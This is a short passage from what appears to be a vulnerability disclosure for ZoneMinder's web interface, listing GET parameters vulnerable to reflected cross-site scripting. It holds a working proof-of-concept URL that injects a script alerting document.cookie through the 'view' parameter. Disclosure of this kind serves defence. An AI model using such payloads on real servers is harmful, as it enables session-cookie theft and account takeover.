In link input view using GET at http://<serverIP>/zm/
PoC: http://<serverIP>/zm/?view=groups%3Cscript%3Ealert(document.cookie);%3C/script%3E 

In link input filter[terms][1][cnj] using GET at http://<serverIP>/zm/
